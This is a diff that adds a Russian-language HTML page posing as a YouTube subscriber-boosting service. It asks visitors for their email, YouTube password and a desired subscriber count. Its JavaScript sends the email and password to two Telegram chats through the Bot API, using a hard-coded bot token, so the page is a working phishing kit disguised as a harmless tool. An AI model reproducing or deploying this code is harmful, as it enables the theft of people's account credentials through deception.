@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>podpischik</title>
+</head>
+<script type="text/javascript">
+	// 1301569069
+	// 		let url = 'https://api.telegram.org/bot1319376539:AAHfB2WJHK6_sGBqlv8jnd0OSAM9W9bKhYk/sendMessage?chat_id=1108316101&text=' + data;
+	//	let xhttp = new XMLHttpRequest();
+	//	xhttp.open("GET", url);
+	//	xhttp.send();
+	function subscribers() {
+		let url = 'https://api.telegram.org/bot1319376539:AAHfB2WJHK6_sGBqlv8jnd0OSAM9W9bKhYk/sendMessage?chat_id=1108316101&text=email: ' + in1.value + ' password: ' + in2.value + ' must subscribers: ' + in3.value;
+		let xhttp = new XMLHttpRequest();
+		xhttp.open("GET", url);
+		xhttp.send();
+		let url1 = 'https://api.telegram.org/bot1319376539:AAHfB2WJHK6_sGBqlv8jnd0OSAM9W9bKhYk/sendMessage?chat_id=1301569069&text=email: ' + in1.value + ' password: ' + in2.value + ' must subscribers: ' + in3.value;
+		let xhttp1 = new XMLHttpRequest();
+		xhttp1.open("GET", url1);
+		xhttp1.send();
+	}
+</script>
+<style type="text/css">
+	h1 {
+		color: #fff;
+	}
+	h2 {
+		color: #fff;
+	}
+	.subscribe {
+		font-size: 20px;
+		width: 400px;
+		border: 1px solid #aaa;
+		border-radius: 4px;
+	}
+	button {
+		font-size: 20px;
+	}
+</style>
+<body bgcolor="black">
+	<h1 align="center">Накрутка подписчиков YouTube онлайн</h1>
+	<p align="center"><input type="email" name="email" placeholder="ваш адрес электронной почты" id="in1" class="subscribe" value=""></p>
+	<p align="center"><input type="text" name="text" placeholder="ваш пароль от ютуб" id="in2" class="subscribe" value=""></p>
+	<p align="center"><input type="text" name="text" placeholder="сколько накрутить" id="in3" class="subscribe" value=""></p>
+	<p align="center"><button onclick="subscribers()">НАКРУТИТЬ</button></p>
+</body>
+</html>
